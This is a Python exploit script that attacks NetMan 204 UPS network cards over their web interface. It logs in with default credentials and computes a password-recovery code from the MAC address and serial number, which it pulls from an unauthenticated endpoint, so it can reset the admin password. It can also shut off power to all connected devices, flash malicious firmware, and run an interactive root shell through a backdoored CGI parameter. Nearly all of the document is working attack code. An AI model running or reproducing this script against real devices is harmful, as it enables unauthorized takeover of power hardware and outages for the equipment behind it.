#!/usr/bin/python3
#==========================#
#  N204-Pwn by @JoelGMSec  #
#   https://darkbyte.net   #
#==========================#

# Imports
import time, sys, os
import requests, tarfile
import hashlib, shutil
import ssl, json, base64, argparse
from termcolor import colored
from urllib.request import urlopen
from urllib3.exceptions import InsecureRequestWarning

# Banner
banner = """
  _   _ ____   ___  _  _         ____                 
 | \ | |___ \ / _ \| || |       |  _ \__      ___ __  
 |  \| | __) | | | | || |_ _____| |_) \ \ /\ / / '_ \ 
 | |\  |/ __/| |_| |__   _|_____|  __/ \ V  V /| | | |
 |_| \_|_____|\___/   |_|       |_|     \_/\_/ |_| |_|                                            
                                                                                                 
  ------------------- by @JoelGMSec -----------------
"""

# Args & Help
print (colored(banner, "blue"))
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--user", default="admin", help="User to access on web server", type=str)
parser.add_argument("-p", "--password", default="admin", help="Password to access on web server", type=str)
parser.add_argument("-t", "--target", help="URL adress to connect", type=str)
parser.add_argument("-s", "--sleep", help="Sleep time before connect again", type=int)
parser.add_argument("-g", "--generate", help="Generate recovery code from input", type=str)
parser.add_argument("-rs", "--reset", action="store_true",help="Try to reset admin password to default")
parser.add_argument("-sh", "--shell", action="store_true", help="Upload evil firmware and get root shell")
parser.add_argument("-pow", "--poweroff", action="store_true", help="Turns off devices plugged into the UPS")
parser.add_argument("-bak", "--backup", action="store_true", help="Restore to the original firmware backup")
args = parser.parse_args()

# Headers
headers = {"User-Agent": "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0",
"Accept": "application/json, text/plain, */*", "X-Requested-With": "XMLHttpRequest",
"Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "DNT": "1", "Connection": "close"}

upheads = {"User-Agent": "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0",
"Accept": "application/json, text/plain, */*", "X-Requested-With": "XMLHttpRequest",
"Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data", "DNT": "1", "Connection": "close"}

powhead = {"User-Agent": "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0",
"Accept": "*/*", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate",
"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "DNT": "1", "Connection": "close"}

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Main
while True:
    try:
        if len(sys.argv) < 2:
            parser.print_help(sys.stderr)    
            break

        if args.generate:
            recover = "NMP" + args.generate[3:]
            recover = hashlib.md5(recover.encode('utf-8')).hexdigest()
            recover = hashlib.sha1(recover.encode('utf-8')).hexdigest()
            recover = recover[5:12]
            print (colored("[+] Recovery code found: " + recover, "green"))
            print()
            break

        if args.target:
            if len(sys.argv) < 4:
                print (colored("[!] No action provided! Use -h to see help!\n", "red"))
                break

            username = args.user ; password = args.password ; target = args.target
            adress = args.target + "/cgi-bin/login.cgi"
            params = "username=" + username + "&password=" + password
            response = requests.get(adress, params=params, headers=headers, verify=False)
            jsondata = response.json()
            for data, token in jsondata.items():
                cookies = token

            if not "403" in response.text:
                output = "[+] Access to " + args.target + " with " + args.user + " user sucessfull!"
                print (colored(output, "green"))
                adress = args.target + "/cgi-bin/logout.cgi"
                response = requests.get(adress, headers=headers, cookies=cookies, verify=False)
                access = True

                if args.reset or args.shell or args.poweroff:
                    pass

                else:
                    print()
                    break

            else:
                output = "[!] Access to " + args.target + " with " + args.user + " user denied!"
                print (colored(output, "red"))
                access = False

                if args.reset or args.shell or args.backup:
                    pass

                else:
                    print()
                    break

            if args.poweroff:
                print (colored("[>] Turning off all plugged UPS devices!", "yellow"))
                adress = args.target + "/cgi-bin/command_shutdown_restore.cgi"
                data = "shutdown=60&restore=65535&socket=x"
                response = requests.post(adress, headers=powhead, data=data, cookies=cookies, verify=False)
                if not args.sleep:
                    time.sleep(15)
                else:
                    time.sleep(args.sleep)
                print (colored("[!] Done!\n", "red"))
                break

        if args.reset or args.shell:
            if not args.password:
                print (colored("[!] No valid user or password provided!\n", "red"))
                break

            else:
                if not access:
                    print (colored("[+] Downloading MAC and serial number..", "blue"))
                    adress = args.target + "/json/netman_data.json"
                    response = requests.get(adress, headers=headers, verify=False)
                    jsondata = json.loads(response.text)
                    
                    if response.ok:
                        mac = jsondata["mac_address"]
                        serial = jsondata["serial_number"]
                        recover = "NMP:" + mac + ":" + serial

                        recover = hashlib.md5(recover.encode('utf-8')).hexdigest()
                        recover = hashlib.sha1(recover.encode('utf-8')).hexdigest()
                        recover = recover[5:12]
                        print (colored("[+] Recovery code found: " + recover, "green"))
                        time.sleep(3)

                        print (colored("[>] Sending password reset..", "yellow"))
                        adress = args.target + "/cgi-bin/recover2.cgi"
                        data = "code=" + recover
                        response = requests.post(adress, headers=headers, data=data, verify=False)
                        jsondata = response.text
                        
                        if not "403" in jsondata:
                            print (colored("[+] Password reset successfully!", "green"))
                            if not args.shell:
                                print()
                                break
                            pass                       
                        else:
                            print (colored("[+] Error on password reset :(", "red"))
                            print()
                            break
                    else:
                        print (colored("[!] Recovery code not found :(\n", "red"))
                        break

        if args.shell or args.backup:
            if not access:
                username = "admin" ; password = "admin" ; target = args.target
                adress = args.target + "/cgi-bin/login.cgi"
                params = "username=" + username + "&password=" + password
                response = requests.get(adress, params=params, headers=headers, verify=False)
                jsondata = response.json()
                for data, token in jsondata.items():
                    cookies = token

            if args.backup:
                print (colored("[>] Uploading original firmware..", "yellow"))
                files = {'filename': ('fwapp.204', open('Firmware/Original/fwapp.204', 'rb'), 'application/octet-stream')}
            else:
                print (colored("[>] Uploading evil firmware..", "yellow")) 
                files = {'filename': ('fwapp.204', open('Firmware/Pwned/fwapp.204', 'rb'), 'application/octet-stream')}
            adress = args.target + "/cgi-bin/upload.cgi"
            requests.post(adress, headers=upheads, cookies=cookies, files=files, verify=False)
            time.sleep(3)
            
            print (colored("[+] Waiting for upgrade changes..", "blue"))
            adress = args.target + "/json/netman_data.json"
            requests.get(adress, headers=headers, verify=False)

            if not args.sleep:
                time.sleep(30)
            else:
                time.sleep(args.sleep)

            if args.backup:
                print (colored("[+] Done!", "green"))
                break

            print (colored("[+] Checking remote code execution..", "green")) ; time.sleep(30)
            adress = args.target + "/cgi-bin/backupCheck.cgi"
            response = requests.get(adress, headers=headers, verify=False)

            if response.ok:
                print (colored("[!] PWNED!! Enjoy your shell :)\n", "red"))               
            
                while True:
                    try:
                        print (colored( "root@netman204 $> ", "green"), end = "")
                        command = input()
                        if "exit" in command:
                            print (colored("Exiting..\n", "red"))
                            break
                        adress = args.target + "/cgi-bin/backupCheck.cgi?code=" + command
                        response = requests.get(adress, headers=headers, verify=False)
                        output = str(response.content.decode(errors="ignore")).replace("<pre>","").replace("</pre>","")
                        print (colored(output, "yellow"))

                    except KeyboardInterrupt:
                        print (colored("\nExiting..\n", "red"))
                        break
                break

            else:
                print (colored("[!] Error getting shell!\n", "red"))
                break

    except requests.exceptions.RequestException as e:
        print (colored("[!] Connection failed!\n", "red"))
        break

    except KeyboardInterrupt:
        print (colored("\nExiting..\n", "red"))
        break
